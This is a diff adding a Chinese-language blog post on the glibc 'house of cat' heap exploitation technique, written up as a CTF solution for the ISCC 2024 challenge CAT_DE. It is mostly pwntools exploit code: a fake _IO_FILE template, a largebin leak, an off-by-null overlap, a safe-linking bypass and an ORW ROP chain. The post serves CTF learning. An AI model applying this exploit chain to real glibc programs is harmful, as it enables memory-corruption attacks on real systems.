@@ -1,0 +1,410 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>house of cat | cccchen</title><meta name="author" content="xiaoton"><meta name="copyright" content="xiaoton"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这次要说的是house系列之house of cat，这个手法，我学了三四天，才有那么一点点觉悟。 首先，这个手法适用于（我目前学到的） 1：高版本且能够触发IO流，且知道libc和堆地址； 2：能够任意地址写（至少一次）； 我们需要伪造一个fake_IO_file 模板 ioaddr&#x3D;heapaddr+0x290next_chain &#x3D; 0fake_IO_FILE &#x3D; p64(0)*4fake_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house of cat">
+<meta property="og:url" content="http://example.com/2024/07/27/house-of-cat/index.html">
+<meta property="og:site_name" content="cccchen">
+<meta property="og:description" content="这次要说的是house系列之house of cat，这个手法，我学了三四天，才有那么一点点觉悟。 首先，这个手法适用于（我目前学到的） 1：高版本且能够触发IO流，且知道libc和堆地址； 2：能够任意地址写（至少一次）； 我们需要伪造一个fake_IO_file 模板 ioaddr&#x3D;heapaddr+0x290next_chain &#x3D; 0fake_IO_FILE &#x3D; p64(0)*4fake_">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/07/29/SY8kXZbsKBxePGz.png">
+<meta property="article:published_time" content="2024-07-27T12:12:11.000Z">
+<meta property="article:modified_time" content="2024-07-29T10:48:24.061Z">
+<meta property="article:author" content="xiaoton">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/07/29/SY8kXZbsKBxePGz.png"><link rel="shortcut icon" href="/img/%E5%9C%86%E8%A7%92-favicon.png"><link rel="canonical" href="http://example.com/2024/07/27/house-of-cat/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'house of cat',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-07-29 18:48:24'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="cccchen" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/%E7%95%99%E8%A8%80/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/%E5%85%B3%E4%BA%8E/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/07/29/SY8kXZbsKBxePGz.png')"><nav id="nav"><span id="blog-info"><a href="/" title="cccchen"><span class="site-name">cccchen</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/%E7%95%99%E8%A8%80/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/%E5%85%B3%E4%BA%8E/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">house of cat</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-27T12:12:11.000Z" title="发表于 2024-07-27 20:12:11">2024-07-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-29T10:48:24.061Z" title="更新于 2024-07-29 18:48:24">2024-07-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="house of cat"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>这次要说的是house系列之house of cat，这个手法，我学了三四天，才有那么一点点觉悟。</p>
+<p>首先，这个手法适用于（我目前学到的）</p>
+<p>1：高版本且能够触发IO流，且知道libc和堆地址；</p>
+<p>2：能够任意地址写（至少一次）；</p>
+<p>我们需要伪造一个fake_IO_file</p>
+<p>模板</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ioaddr=heapaddr+<span class="number">0x290</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(ioaddr+<span class="number">0xb0</span>) <span class="comment">#_IO_backup_base</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment"># _IO_save_end</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  </span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapaddr+<span class="number">0x200</span>)  <span class="comment">#_lock</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(ioaddr+<span class="number">0x30</span>) <span class="comment">#_wide_data</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)  <span class="comment"># mode = 1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2170d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(ioaddr+<span class="number">0x40</span>)  <span class="comment"># rax2</span></span><br><span class="line">flagaddr=heapaddr+<span class="number">0x1e250</span></span><br><span class="line">payload1=fake_IO_FILE+p64(flagaddr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(heapaddr+<span class="number">0x6c0</span>+<span class="number">0x10</span>)<span class="comment">#ropaddr</span></span><br><span class="line">payload1+=p64(ret)</span><br></pre></td></tr></table></figure>
+
+<p>触发malloc_assert后，程序原本的_IO_FILE</p>
+<p><img src="/2024/07/27/house-of-cat/2.png"></p>
+<p>正常的执行流:<img src="/2024/07/27/house-of-cat/3.png"></p>
+<p>​																				 ||</p>
+<p>​																				 ||</p>
+<p>​																				 /<img src="/2024/07/27/house-of-cat/5.png"></p>
+<p>​																				 ||</p>
+<p>​																				 ||</p>
+<p>​																				 /</p>
+<p><img src="/2024/07/27/house-of-cat/6.png"></p>
+<p>​																				 ||</p>
+<p>​																				 ||</p>
+<p>​																				 /</p>
+<p><img src="/2024/07/27/house-of-cat/7.png"></p>
+<p>可以看到之后call的是[__IO_file_jumps+0x38]</p>
+<p>我们看一下vtable _IO_file_jumps</p>
+<p><img src="/2024/07/27/house-of-cat/8.png"></p>
+<p>可以看到__IO_file_jumps+0x38对应的正是虚函数 _IO_new_file_xsputn。</p>
+<p>再来看一下伪造的，当我们把程序原本的_IO_FILE的 vtable: _IO_file_jumps更换为__IO_file_jumps+0x10,那么根据虚表后面会调用 _IO_new_file_seekoff ，</p>
+<p><img src="/2024/07/27/house-of-cat/9.png"></p>
+<p><img src="/2024/07/27/house-of-cat/10.png"></p>
+<p>此时rdi是我们的ioaddr也就是我们所伪造的fake_io_file</p>
+<p>这里感觉<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273895.htm">CatF1y</a>师傅讲的太好了，索性搬过来一点。</p>
+<p>其中_IO_wfile_seekoff函数代码如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中fp结构体是我们可以伪造的，可以控制fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base来调用_IO_switch_to_wget_mode这个函数，继续跟进代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们再来看看_IO_switch_to_wget_mode汇编代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">► <span class="number">0x7f4cae745d30</span> &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  <span class="number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="number">4</span>&gt;     mov    rax, qword ptr [rdi + <span class="number">0xa0</span>]</span><br><span class="line">  <span class="number">0x7f4cae745d3b</span> &lt;_IO_switch_to_wget_mode+<span class="number">11</span>&gt;    push   rbx</span><br><span class="line">  <span class="number">0x7f4cae745d3c</span> &lt;_IO_switch_to_wget_mode+<span class="number">12</span>&gt;    mov    rbx, rdi</span><br><span class="line">  <span class="number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line">  <span class="number">0x7f4cae745d43</span> &lt;_IO_switch_to_wget_mode+<span class="number">19</span>&gt;    cmp    rdx, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line">  <span class="number">0x7f4cae745d47</span> &lt;_IO_switch_to_wget_mode+<span class="number">23</span>&gt;    jbe    _IO_switch_to_wget_mode+<span class="number">56</span>                &lt;_IO_switch_to_wget_mode+<span class="number">56</span>&gt;</span><br><span class="line"> </span><br><span class="line">  <span class="number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="number">25</span>&gt;    mov    rax, qword ptr [rax + <span class="number">0xe0</span>]</span><br><span class="line">  <span class="number">0x7f4cae745d50</span> &lt;_IO_switch_to_wget_mode+<span class="number">32</span>&gt;    mov    esi, <span class="number">0xffffffff</span></span><br><span class="line">  <span class="number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure>
+
+<p>主要关注这几句，做了一下几点事情</p>
+<p>1.将[rdi+0xa0]处的内容赋值给rax，为了避免与下面的rax混淆，称之为<strong>rax1</strong>。<br>2.将新赋值的[rax1+0x20]处的内容赋值给rdx。<br>3.将[rax1+0xe0]处的内容赋值给rax，称之为<strong>rax2</strong>。<br>4.call调用[rax2+0x18]处的内容。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="number">4</span>&gt;     mov    rax, qword ptr [rdi + <span class="number">0xa0</span>]</span><br><span class="line"><span class="number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line"><span class="number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="number">25</span>&gt;    mov    rax, qword ptr [rax + <span class="number">0xe0</span>]</span><br><span class="line"><span class="number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里最终call的就是[ [ [rdi+0xa0]+0xe0]+0x18]，也就是我们上面fake_io_file的setcontext+61(慢慢调试)</p>
+<p>然后我们再看</p>
+<p><img src="/2024/07/27/house-of-cat/11.png"></p>
+<p>根据执行setcontext+61，最后会执行rdx+0xa8和0xa0</p>
+<p>再合理布置好rop就行了。</p>
+<p>就拿2024年的iscc中的<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1F9BYyI1pcJqrZoMXryCY5A?pwd=chen">CAT_DE</a>来演示吧</p>
+<p>题目环境：2.35</p>
+<p><img src="/2024/07/27/house-of-cat/12.png"></p>
+<p><img src="/2024/07/27/house-of-cat/13.png"></p>
+<p>有UAF，禁用了execve，并且exit里面可以溢出一个”\x00”。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x420</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x430</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x430</span>,<span class="string">b&quot;flag&quot;</span>)</span><br><span class="line">add(<span class="number">0x420</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;context:&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\x0a&quot;</span>)</span><br><span class="line">libcbase=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x21a0d0</span>-<span class="number">0xf30</span></span><br><span class="line">p.recv(<span class="number">10</span>)</span><br><span class="line">heapaddr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x290</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heapaddr))</span><br></pre></td></tr></table></figure>
+
+<p>利用UAF，使用largebin泄露libc和heapaddr。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&quot;\x00&quot;</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x3f8</span>,<span class="string">b&quot;\x00&quot;</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&quot;\x00&quot;</span>)<span class="comment">#12</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&quot;\x00&quot;</span>)<span class="comment">#13</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&quot;\x00&quot;</span>)<span class="comment">#14</span></span><br><span class="line">edit(<span class="number">10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x4f1</span>)+p64(heapaddr+<span class="number">0x1970</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">11</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x3f0</span>+p64(<span class="number">0x4f0</span>)+<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">9</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">add(<span class="number">0x420</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br></pre></td></tr></table></figure>
+
+<p>利用off by null打堆块重叠。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heapaddr&gt;&gt;<span class="number">12</span>))</span><br><span class="line">m=(heapaddr&gt;&gt;<span class="number">12</span>)+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m))</span><br><span class="line">l=m^stderr<span class="comment">#高版本glibc堆fd指针加密绕过</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====&gt;&quot;</span>+<span class="built_in">hex</span>(stderr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(l))</span><br><span class="line">edit(<span class="number">10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>)+p64(libcbase+<span class="number">0x21b100</span>)*<span class="number">2</span>+p64(heapaddr+<span class="number">0x1970</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)*<span class="number">17</span>+p64(<span class="number">0xb1</span>)+p64(l))</span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,payload1)</span><br><span class="line">edit(<span class="number">6</span>,p64(heapaddr+<span class="number">0x290</span>))</span><br></pre></td></tr></table></figure>
+
+<p>由于是libc2.35,我们无法直接修改正确的fd指针，需要进行fd指针加密绕过，具体可以看</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/myxa/p/18228800">高版本libc堆fd指针绕过 - 蟇窳瓨 - 博客园 (cnblogs.com)</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(rdi)+p64(flagaddr)+p64(rsi)+p64(<span class="number">0</span>)+p64(rdxr12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(rax)+p64(<span class="number">2</span>)+p64(syscallret)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(heapaddr+<span class="number">0x200</span>)+p64(rdxr12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(rax)+p64(<span class="number">0</span>)+p64(syscallret)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(heapaddr+<span class="number">0x200</span>)+p64(rdxr12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(rax)+p64(<span class="number">1</span>)+p64(syscallret)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>在一个可写的地方（一般是堆块）布置rop</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    add(<span class="number">0x2000</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x2000</span>-<span class="number">0x8</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">edit(<span class="number">24</span>,<span class="string">b&quot;flag\x00&quot;</span>+<span class="string">b&quot;a&quot;</span>*(<span class="number">0x2000</span>-<span class="number">4</span>))</span><br><span class="line">p.sendlineafter( <span class="string">b&#x27;input your car choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br></pre></td></tr></table></figure>
+
+<p>最后触发malloc_assert。</p>
+<p>exp</p>
